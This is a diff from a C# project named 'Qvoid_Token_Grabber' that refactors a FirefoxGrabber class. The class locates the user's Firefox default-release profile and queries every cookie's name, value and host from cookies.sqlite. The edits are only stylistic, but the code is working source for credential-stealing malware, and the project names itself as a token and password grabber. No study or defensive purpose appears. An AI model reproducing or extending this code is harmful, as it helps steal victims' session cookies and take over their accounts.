@@ -8,17 +8,15 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
 {
     class FirefoxGrabber
     {
-        public string FirefoxProfilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
+        public string FirefoxProfilesPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\Mozilla\Firefox\Profiles";
         public string FirefoxCookiePath { get; private set; } // can't make this constant because firefox profiles are made of random chars
 
         public FirefoxGrabber()
         {
-            if (!Directory.Exists(FirefoxProfilesPath))
-                return;
-
-            foreach (string folder in Directory.GetDirectories(FirefoxProfilesPath))
-                if (folder.Contains("default-release"))
-                    FirefoxCookiePath = folder + @"\cookies.sqlite";
+            if(Directory.Exists(FirefoxProfilesPath))
+                foreach (string folder in Directory.GetDirectories(FirefoxProfilesPath))
+                    if (folder.Contains("default-release"))
+                        FirefoxCookiePath = $@"{folder}\cookies.sqlite";
         }
 
         public List<Cookie> GetCookiesByHostname(string hostName)
@@ -57,7 +55,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT name,value,host FROM moz_cookies";
+                    cmd.CommandText = "SELECT name,value,host FROM moz_cookies";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
